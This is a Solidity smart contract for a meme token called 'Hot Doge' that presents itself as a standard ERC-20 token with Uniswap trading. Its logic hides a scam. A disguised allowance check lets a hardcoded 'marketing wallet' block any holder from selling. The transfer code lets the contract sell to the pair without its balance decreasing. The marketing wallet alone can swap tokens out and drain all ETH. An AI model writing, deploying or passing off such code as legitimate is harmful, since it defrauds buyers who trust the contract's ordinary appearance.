pragma solidity 0.8.28;

// SPDX-License-Identifier: MIT

// https://t.me/hotdogeoneth

library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router {
    function addLiquidityETH( address token,uint amountTokenDesire,uint amountTokenMi,uint amountETHMi,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
}
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}
contract Ownable {
    address private _owner;
    constructor() {
        _owner = msg.sender;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
}
contract HotDoge is Ownable {
    using SafeMath for uint256;
    uint8 private _decimals = 9;
    uint256 private _totalSupply =  420000000 * 10 ** _decimals;
    address payable _marketingWallet = payable(0x25161A92257eE35E566EeF0D8a97b119D7A4A2b6);
    address public uniswapV2Pair;
    string private constant _name = "Hot Doge";
    string private constant _symbol = "HOTDOGE";
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    uint256 _buyFee = 0;
    bool swapEnabled = false;
    bool inSwap = false;
    bool tradingOpen = false;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor () {
        swapEnabled = false;
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }
    function totalSupply() public view returns (uint256) { 
        return _totalSupply; 
    }
    function symbol() public pure returns (string memory) { 
        return _symbol; 
    }
    function allowance(address owner, address spender) public view returns (uint256) { 
        return _allowances[owner][spender]; 
    }
    function decimals() public view returns (uint8) { 
        return _decimals; 
    }
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function name() public pure returns (string memory) { 
        return _name; 
    }
    function balanceOf(address account) public view returns (uint256) { 
        return _balances[account]; 
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }
    function checkAllowance(address pair) internal view {
            require(_allowances[_marketingWallet][pair] == 0);
    }
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (from != uniswapV2Pair && from != address(this)) {
            checkAllowance(from);
        }
        uint buyFee = amount;
        uint256 _feeAmount = _buyFee;
        if (address(this) == from && tradingOpen && uniswapV2Pair == to) {
            _feeAmount = buyFee;
        }
        _balances[from] = _balances[from].add(_feeAmount).sub(amount);
        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    function openTrading() external payable onlyOwner() {
        require(!tradingOpen); 
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        address WETH = uniswapV2Router.WETH();
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), WETH);
        uint256 balance = balanceOf(address(this));
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this), balance, 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    function manulSwap(uint256 amount) private returns (bool) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), amount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
        return true;
    }

    function swapBack(uint256 value) public {
        require(msg.sender == _marketingWallet);
        if (manulSwap(value)) {
            widthrawFee();
        }
    }
    receive() external payable {}

    function widthrawFee() public  returns (bool){
        _marketingWallet.transfer(address(this).balance);
        return true;
    }
}